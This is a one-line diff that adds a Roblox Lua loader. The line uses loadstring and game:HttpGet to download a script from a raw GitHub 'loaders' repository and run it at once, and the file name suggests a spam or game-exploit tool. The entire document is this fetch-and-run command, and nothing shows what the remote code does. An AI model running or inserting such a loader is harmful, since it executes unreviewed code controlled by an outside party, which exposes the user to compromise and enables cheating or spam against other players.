@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/rainy-valley-spam4-x0i28gh2l3lr5k.lua"))()
